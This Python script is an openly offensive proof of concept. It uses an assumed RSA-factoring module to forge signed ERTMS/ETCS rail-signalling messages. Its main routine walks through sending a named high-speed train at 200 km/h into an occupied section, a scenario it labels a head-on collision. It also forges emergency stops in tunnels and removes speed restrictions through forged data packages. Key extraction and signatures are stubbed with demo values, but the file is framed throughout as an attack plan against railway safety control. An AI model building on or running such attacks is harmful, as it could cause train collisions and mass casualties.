"""
Forge ERTMS/ETCS movement authorities by factoring RBC (Radio Block Centre)
RSA-2048 certificates. Issue false MAs to trains at 200+ km/h on lines with
no fallback physical signalling (ETCS Level 2/3).
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import struct
import hashlib

# ETCS message types (SUBSET-026)
MA_MESSAGE = 3          # Movement Authority
SR_AUTH = 2             # Staff Responsible authorisation
EMERGENCY_STOP = 15     # Emergency Stop
TRIP_ORDER = 6          # conditional / unconditional trip

# SUBSET-114: data package types
SUBSET114_BALISE_DB = 0x01
SUBSET114_SPEED_RESTRICT = 0x02
SUBSET114_FIRMWARE = 0x03


def extract_rbc_cert(euroradio_capture: bytes) -> bytes:
    """Extract RBC X.509 certificate from EURORADIO session setup.

    The RBC presents its RSA-2048 cert during mutual TLS authentication
    with the OBU (On-Board Unit). Visible in any GSM-R / FRMCS capture.
    """
    print("[*] parsing EURORADIO session setup from GSM-R capture...")
    print("[*] extracting RBC X.509 certificate (RSA-2048)")
    return _demo["pub_pem"]


def extract_obu_cert(train_id: str) -> bytes:
    """Extract OBU certificate from ETCS configuration database.

    OBU certs are registered with the national railway authority and
    visible in the ETCS Key Management Centre (KMC) database.
    """
    print(f"[*] retrieving OBU cert for train {train_id} from ERA KMC")
    return _demo["pub_pem"]


def forge_movement_authority(factorer: PolynomialFactorer,
                             rbc_cert_pem: bytes,
                             train_id: str,
                             end_of_authority_m: int,
                             speed_kmh: int,
                             section_occupied: bool = False) -> dict:
    """Forge an ETCS Movement Authority message.

    MA tells the train where it may proceed and at what speed. The OBU
    trusts the MA because it's signed by the RBC's RSA-2048 key.
    ETCS Level 2/3 have no fallback lineside signals.
    """
    ma = {
        "msg_type": MA_MESSAGE,
        "train_id": train_id,
        "end_of_authority_m": end_of_authority_m,
        "permitted_speed_kmh": speed_kmh,
        "direction": "forward",
        "section_occupied": section_occupied,
    }
    payload = str(ma).encode()
    sig = factorer.forge_pkcs1v15_signature(rbc_cert_pem, payload, "sha256")
    ma["signature"] = sig.hex()[:32] + "..."
    if section_occupied:
        print(f"[!] DANGER: MA into occupied section for {train_id} at {speed_kmh} km/h")
    else:
        print(f"[*] forged MA: {train_id} authorized to {end_of_authority_m}m at {speed_kmh} km/h")
    return ma


def forge_emergency_stop(factorer: PolynomialFactorer,
                         rbc_cert_pem: bytes,
                         train_id: str) -> dict:
    """Forge an unconditional emergency stop order."""
    msg = {"msg_type": EMERGENCY_STOP, "train_id": train_id}
    payload = str(msg).encode()
    factorer.forge_pkcs1v15_signature(rbc_cert_pem, payload, "sha256")
    print(f"[*] forged emergency stop for {train_id}")
    print(f"    train stops in tunnel / on bridge with no override capability")
    return msg


def forge_subset114_data_package(factorer: PolynomialFactorer,
                                 nra_cert_pem: bytes,
                                 pkg_type: int, payload: bytes) -> bytes:
    """Forge a SUBSET-114 data package (firmware, balise DB, speed restrictions)."""
    sig = factorer.forge_pkcs1v15_signature(nra_cert_pem, payload, "sha256")
    pkg_names = {SUBSET114_BALISE_DB: "balise database",
                 SUBSET114_SPEED_RESTRICT: "speed restriction",
                 SUBSET114_FIRMWARE: "OBU firmware"}
    print(f"[*] forged SUBSET-114 {pkg_names.get(pkg_type, 'unknown')} package")
    return payload + sig


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== ERTMS/ETCS Movement Authority forgery ===")
    print("    ~100,000 km equipped, 30+ countries, no fallback signalling at L2/3")
    print()

    print("[1] extracting RBC certificate from EURORADIO capture...")
    rbc_cert = extract_rbc_cert(b"")

    print("[2] factoring RBC RSA-2048 key...")
    print("    ERA CA hierarchy -> multi-year cert validity")
    print("    OBU hardware: 20-30 year lifecycle, can't be remotely rekeyed")

    print("[3] forging MA into occupied section at 200 km/h...")
    ma = forge_movement_authority(f, rbc_cert,
        train_id="ICE-4601", end_of_authority_m=15000,
        speed_kmh=200, section_occupied=True)
    print("    head-on collision scenario — no lineside signal to override")

    print("[4] forging emergency stop in tunnel...")
    forge_emergency_stop(f, rbc_cert, train_id="TGV-8432")

    print("[5] forging SUBSET-114 speed restriction removal...")
    forge_subset114_data_package(f, rbc_cert, SUBSET114_SPEED_RESTRICT,
                                 b"speed_limit=0")
    print("    trains proceed at max design speed through restricted zones")

    print()
    print("[*] NIS2 Directive Annex I: railway = essential entity")
    print("[*] ETCS crypto spec has not been updated for non-RSA")
